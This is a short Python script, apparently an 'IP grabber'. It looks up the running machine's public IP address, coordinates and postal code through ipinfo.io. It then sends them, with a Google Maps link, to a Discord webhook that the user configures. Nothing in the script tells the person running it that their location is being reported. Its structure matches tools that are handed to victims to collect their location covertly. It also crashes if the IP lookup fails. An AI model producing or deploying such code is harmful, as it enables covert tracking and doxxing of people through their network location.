import httpx
from discord_webhook import DiscordWebhook, DiscordEmbed

ip = "None"
try:
	data = httpx.get("https://ipinfo.io/json").json()
	ip = data['ip']
	loc= data['loc']
	postal = data['postal']
except Exception:
	print("No se pudo extraer dir. IP")
googlemap = "https://www.google.com/maps/search/google+map++" + \
	data.get('loc')

#Ingresar url de Discord Weebhook en "Discord Weebhook URL"
webhook = DiscordWebhook(url="Discord Weebhook URL", 
		username="Ip Info")
embed = DiscordEmbed(
    title="Información extraída:", description=f"[Google Maps]({googlemap})", color='03b2f8'
)
embed.set_author(
    name="Reimound's Ip Info",
    # url=f"{googlemap}",
    icon_url="https://cdn.discordapp.com/avatars/905674803598479370/df1f6f6e8a7cc2648f23adbe2046b7c8.webp",
)
embed.set_footer(text="Reimound's Ip Info")
embed.set_timestamp()
# Set `inline=False` for the embed field to occupy the whole line
embed.add_embed_field(name="[Ip]", value=f'''```{ip}```''', inline = False)
embed.add_embed_field(name="[Localización]", value=f'''```{loc}```''', inline = False)
embed.add_embed_field(name="[Código postal]", value=f'''```{postal}```''', inline = False)
embed.add_embed_field(name=f"[Google Maps]", value=f'''```{googlemap}```''')

webhook.add_embed(embed)
response = webhook.execute()
